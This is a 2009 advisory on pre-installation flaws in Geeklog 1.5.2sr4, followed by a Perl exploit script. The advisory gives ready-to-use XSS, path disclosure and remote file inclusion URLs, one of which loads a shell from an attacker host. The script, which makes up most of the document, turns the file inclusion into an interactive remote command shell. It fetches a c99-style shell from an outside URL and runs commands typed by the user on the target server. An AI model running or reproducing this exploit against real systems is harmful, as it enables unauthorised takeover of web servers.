#Geeklog - Pre-Installation Vulnerabilities
#
#Version Affected: 1.5.2sr4 (18th April 2009) (newest)
#
#Info: See website for more details.
#
#Opinion: The system seems to be more secure than most web application systems on the Internet these days.
#
#Credits: InterN0T
#
#External Links:
#http://www.geeklog.net/
#
#
#-:: The Advisory ::-
#
#Vulnerable Function / ID Calls:
#dbconfig_path, contains multiple bugs that can be used to perform: XSS, RFI and Path Disclosure.
#
#Cross Site Scripting: 
#http://www.website.tld/geeklog/public_html/admin/install/index.php?mode="><script>alert(0)</script>dbconfig_path="><script>alert(0)</script>
#
#Path Disclosure:
#http://www.website.tld/geeklog/public_html/admin/install/index.php?mode='&dbconfig_path='
#
#Remote File Inclusion:
#http://www.website.tld/geeklog/public_html/admin/install/index.php?mode='&dbconfig_path=http://www.evilsite.tld/shell.txt?
#
#
#-:: Solution ::-
#I didn't bother to find one, sorry.
#
#Reference:
#http://forum.intern0t.net/intern0t-advisories/1083-intern0t-geeklog-1-5-pre-installation-vulnerabilities.html
#
#Disclosure Information:
#- Vulnerabilities found and confirmed between 1st and 3rd June 2009.
#- Published at InterN0T the 3rd June 2009.
#- Bugtraq contacted the 3rd June 2009.
#
#
#All of the best,
#MaXe



use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] Geeklog - Pre-Installation Remote File Inclusion Exploit (I)\n";
	print "[x] Version Affected: 1.5.2sr4 (18th April 2009) (newest)\n\n";
	print "[x] Author InterN0T\n";
	print "[x] email: security@intern0t.net \n";
	print "[x] Website: www.intern0t.net \n\n";
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
	print "[x] http://solidmecca.co.nr\n";
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/geeklog/public_html/admin/install/index.php?mode='&dbconfig_path=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

